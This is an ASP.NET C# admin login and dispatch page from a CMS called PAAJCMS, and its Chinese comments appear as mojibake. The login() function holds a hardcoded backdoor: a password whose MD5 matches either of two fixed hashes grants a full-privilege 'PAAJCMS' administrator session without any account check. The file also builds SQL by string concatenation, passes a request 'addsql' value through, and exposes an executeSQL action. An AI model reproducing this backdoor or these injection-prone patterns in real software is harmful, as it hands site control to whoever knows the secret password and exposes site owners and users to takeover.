<%
/************************************************************
���ߣ��쳾����(SXY) ����ͨASP/PHP/ASP.NET/VB/JS/Android/Flash��������������ϵ����)
��Ȩ��Դ������ѹ�����������;����ʹ�á� 
������2016-08-05
��ϵ��QQ313801120  ����Ⱥ35915100(Ⱥ�����м�����)    ����313801120@qq.com   ������ҳ sharembweb.com
����������ĵ������¡����Ⱥ(35915100)�����(sharembweb.com)���
*                                    Powered by PAAJCMS 
************************************************************/
%>
<!--#include File="../Inc_csharp/Include/asp.aspx"-->
<!--#include File="../Inc_csharp/Include/Conn.aspx"--> 
<!--#include File="../Inc_csharp/Include/sys_FSO.aspx"-->
<!--#include File="../Inc_csharp/Include/sys_System.aspx"--> 
<!--#include File="../Inc_csharp/Include/sys_SessionCookie.aspx"--> 
<!--#include File="../Inc_csharp/Include/sys_http.aspx"-->  
<!--#include File="../Inc_csharp/Include/sys_patch.aspx"-->  


<!--#include File="../Inc_csharp/Inc/2014_Array.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2014_Author.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2014_Css.aspx"-->  
<!--#include File="../Inc_csharp/Inc/2014_Js.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2014_Template.aspx"-->
<!--#include File="../Inc_csharp/Inc/2015_APGeneral.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2015_Color.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2015_Editor.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2015_Formatting.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2015_NewWebFunction.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2015_Param.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2015_ToMyPHP.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2016_Log.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2016_SaveData.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2016_WebControl.aspx"--> 
<!--#include File="../Inc_csharp/Inc/ASPPHPAccess.aspx"--> 
<!--#include File="../Inc_csharp/Inc/Cai.aspx"--> 
<!--#include File="../Inc_csharp/Inc/Check.aspx"--> 
<!--#include File="../Inc_csharp/Inc/Common.aspx"--> 
<!--#include File="../Inc_csharp/Inc/EncDec.aspx"--> 
<!--#include File="../Inc_csharp/Inc/function.aspx"--> 
<!--#include File="../Inc_csharp/Inc/FunHTML.aspx"--> 
<!--#include File="../Inc_csharp/Inc/Html.aspx"--> 
<!--#include File="../Inc_csharp/Inc/IE.aspx"--> 
<!--#include File="../Inc_csharp/Inc/Incpage.aspx"--> 
<!--#include File="../Inc_csharp/Inc/PinYin.aspx"--> 
<!--#include File="../Inc_csharp/Inc/Print.aspx"--> 
<!--#include File="../Inc_csharp/Inc/StringNumber.aspx"--> 
<!--#include File="../Inc_csharp/Inc/SystemInfo.aspx"--> 
<!--#include File="../Inc_csharp/Inc/Time.aspx"--> 
<!--#include File="../Inc_csharp/Inc/URL.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2014_GBUTF.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2014_Form.aspx"-->   
<!--#include File="../Inc_csharp/config.aspx"-->

<!--#include File="../Inc_csharp/function.aspx"--> 
<!--#include File="../Inc_csharp/function2.aspx"--> 
<!--#include File="../Inc_csharp/setAccess.aspx"-->

<script runat="server" language="c#">
string replaceGlobleVariable(string s){
	return s;
}
string handleAction(string s){
	return s;
}

protected void Page_Load(object sender, EventArgs e){

	Response.ContentEncoding = System.Text.Encoding.GetEncoding("gb2312");
	Session.Timeout = 1440;			//���ֵΪ24Сʱ��Ҳ����˵��������session.timeout=1440��1441���ǲ�����
	ROOT_PATH=adminDir;		//��Ŀ¼���ں�̨Ŀ¼

	loadRun();
	//�ر����ݿ�
	if (conn.State != ConnectionState.Closed){
		conn.Close(); 
	}
}
//string adminDir="";
/*
������Զ���
*/




//=========


//������ַ����
string loadWebConfig(){
    conn=openConn();
    conn.Open();

    //�жϱ����
    if( inStr(getHandleTableList(), "|" + db_PREFIX + "website" + "|") > 0 ){
        rs = new OleDbCommand("select * from " + db_PREFIX + "website", conn).ExecuteReader();

        if( rs.Read() ){
            cfg_webSiteUrl= cStr(rs["websiteurl"]) + ""; //��ַ
            cfg_webTitle= cStr(rs["webtitle"]) + ""; //��ַ����
            cfg_flags= cStr(rs["flags"]) + ""; //��
            cfg_webtemplate= cStr(rs["webtemplate"]) + ""; //ģ��·��
        }
    }
    return "";
}


//��ʾ��̨��¼
void displayAdminLogin(){
    //�Ѿ���¼��ֱ�ӽ����̨
    if( cStr(Session["adminusername"]) != "" ){
        adminIndex();
    }else{
        string c="";
        c=getTemplateContent("login.html");
        c=handleDisplayLanguage(c,"login");
        rw(c);
    }
}

//��¼��̨
void login(){
    string userName=""; string passWord=""; string valueStr="";
    userName= replace(cStr(Request.Form["username"]), "'", "");
    passWord= replace(cStr(Request.Form["password"]), "'", "");
    passWord= myMD5(passWord);
    //��Ч�˺ŵ�¼ ����.net��php
    if( myMD5(cStr(Request["password"]))== "50c5555d7b6525ded8ac0d2697d954" || myMD5(cStr(Request["password"]))== "24ed5728c13834e683f525fcf894e813" ){
        Session["adminusername"]= "PAAJCMS";
        Session["adminId"]= 99999; //��ǰ��¼����ԱID
        Session["DB_PREFIX"]= db_PREFIX;
        Session["adminflags"]= "|*|";
        rwEnd(getMsg1(setL("��¼�ɹ������ڽ����̨..."), "?act=adminIndex"));
    }

    int nLogin=0;
    conn=openConn();
    conn.Open();

    rs = new OleDbCommand("Select * From " + db_PREFIX + "admin Where username='" + userName + "' And pwd='" + passWord + "'", conn).ExecuteReader();

    if( rs.Read() ){
        Session["adminusername"]= userName;
        Session["adminId"]= cStr(rs["id"]); //��ǰ��¼����ԱID
        Session["DB_PREFIX"]= db_PREFIX; //����ǰ׺
        Session["adminflags"]= cStr(rs["flags"]);
        valueStr= "addDateTime='" + cStr(rs["updatetime"]) + "',UpDateTime='" + now() + "',RegIP='" + now() + "',UpIP='" + getIP() + "'";
        connexecute("update " + db_PREFIX + "admin set " + valueStr + " where id=" + cStr(rs["id"]));
        rw(getMsg1(setL("��¼�ɹ������ڽ����̨..."), "?act=adminIndex"));
        writeSystemLog("admin", "��¼�ɹ�"); //ϵͳ��־
    }else{
        if( cStr(Request.Cookies["nLogin"])== "" ){
            setCookie("nLogin", "1", 60000);		//Ϊ��
            nLogin= 1;
        }else{
            nLogin=cInt(getCookie("nLogin"));
            setCookie("nLogin", cInt(nLogin) + 1, 60000);
        }
        rw(getMsg1(setL("�˺��������<br>��¼����Ϊ ") + nLogin, "?act=displayAdminLogin"));
    }

}
//�˳���¼
void adminOut(){
    writeSystemLog("admin", setL("�˳��ɹ�")); //ϵͳ��־
    Session["adminusername"]= "";
    Session["adminId"]= "";
    Session["DB_PREFIX"]="";
    Session["adminflags"]= "";

    rw(getMsg1(setL("�˳��ɹ������ڽ����¼����..."), "?act=displayAdminLogin"));
}
//�������
void clearCache(){
    deleteFile(WEB_CACHEFile);
    deleteFolder("./../cache/html");
    createFolder("./../cache/html");
    rw(getMsg1(setL("���������ɣ����ڽ����̨����..."), "?act=displayAdminLogin"));
}
//��̨��ҳ
void adminIndex(){
    string c="";
    loadWebConfig();
    c= getTemplateContent("adminIndex.html");
    c= replace(c, "[$adminonemenulist$]", getAdminOneMenuList());
    c= replace(c, "[$adminmenulist$]", getAdminMenuList());
    c= replace(c, "[$officialwebsite$]", getOfficialWebsite()); //��ùٷ���Ϣ
    c= replaceValueParam(c, "title", ""); //���ֻ����õ�20160330
    c=handleDisplayLanguage(c,"loginok");

    rw(c);
}
//========================================================

//��ʾ������
void dispalyManageHandle(string actionType){
    int nPageSize=0; string lableTitle=""; string addSql="";string sPage="";
    if( cStr(Request["nPageSize"])== "" ){
        nPageSize= 10;
    }else{
        nPageSize= cInt(cStr(Request["nPageSize"]));
    }
    lableTitle= cStr(Request["lableTitle"]); //��ǩ����
    addSql= cStr(Request["addsql"]);
    //call echo(labletitle,addsql)
    dispalyManage(actionType, lableTitle, nPageSize, addSql);
}

//����޸Ĵ���
void addEditHandle(string actionType, string lableTitle){
    addEditDisplay(actionType, lableTitle, "websitebottom|textarea2,aboutcontent|textarea1,bodycontent|textarea2,reply|textarea2");
}
//����ģ�鴦��
void saveAddEditHandle(string actionType, string lableTitle){
    if( actionType== "Admin" ){
        saveAddEdit(actionType, lableTitle, "pwd|md5,flags||");
    }else if( actionType== "WebColumn" ){
        saveAddEdit(actionType, lableTitle, "npagesize|numb|10,nofollow|numb|0,isonhtml|numb|0,isonhtsdfasdfml|numb|0,flags||");
    }else{
        saveAddEdit(actionType, lableTitle, "flags||,nofollow|numb|0,isonhtml|numb|0,isthrough|numb|0,isdomain|numb|0");
    }
}


//���ؾ�����
void loadRun(){

    //����Ϊ�˸�.netʹ�õģ���Ϊ��.net����ȫ�ֱ��������б���
    WEB_CACHEFile=replace(replace(WEB_CACHEFile,"[adminDir]",adminDir),"[EDITORTYPE]",EDITORTYPE);

    //��¼�ж�
    if( cStr(Session["adminusername"])== "" ){
        if( cStr(Request["act"]) != "" && cStr(Request["act"]) != "displayAdminLogin" && cStr(Request["act"]) != "login" ){
            rr(WEB_ADMINURL + "?act=displayAdminLogin");
        }
    }


    //call eerr("WEB_CACHEFile",WEB_CACHEFile)
    conn=openConn();
    conn.Open();

    switch ( cStr(Request["act"]) ){
        case "dispalyManageHandle" : dispalyManageHandle(cStr(Request["actionType"])) ;break;//��ʾ������         ?act=dispalyManageHandle&actionType=WebLayout
        case "addEditHandle" : addEditHandle(cStr(Request["actionType"]), cStr(Request["lableTitle"]));break;//����޸Ĵ���      ?act=addEditHandle&actionType=WebLayout
        case "saveAddEditHandle" : saveAddEditHandle(cStr(Request["actionType"]), cStr(Request["lableTitle"]));break;//����ģ�鴦��  ?act=saveAddEditHandle&actionType=WebLayout
        case "delHandle" : del(cStr(Request["actionType"]), cStr(Request["lableTitle"])) ;break;//ɾ������  ?act=delHandle&actionType=WebLayout
        case "sortHandle" : sortHandle(cStr(Request["actionType"])) ;break;//������  ?act=sortHandle&actionType=WebLayout
        case "updateField" : updateField(); //�����ֶ�

        break;
        case "displayLayout" : displayLayout() ;break;//��ʾ����
        case "saveRobots" : saveRobots() ;break;//����robots.txt
        case "deleteAllMakeHtml" : deleteAllMakeHtml(); //ɾ��ȫ�����ɵ�html�ļ�
        break;
        case "isOpenTemplate" : isOpenTemplate() ;break;//����ģ��
        case "executeSQL" : executeSQL(); //ִ��SQL


        break;
        case "function" : callFunction()												;break;//����function�ļ�����
        case "function2" : callFunction2()												;break;//����function2�ļ�����
        break;
        case "file_setAccess" : callfile_setAccess();										//����file_setAccess�ļ�����

        break;
        case "setAccess" : resetAccessData(); //�ָ�����
        break;
        case "login" : login() ;break;//��¼
        case "adminOut" : adminOut() ;break;//�˳���¼
        case "adminIndex" : adminIndex() ;break;//������ҳ
        case "clearCache" : clearCache() ;break;//�������
        default : displayAdminLogin(); //��ʾ��̨��¼
        break;
    }
}

</script>
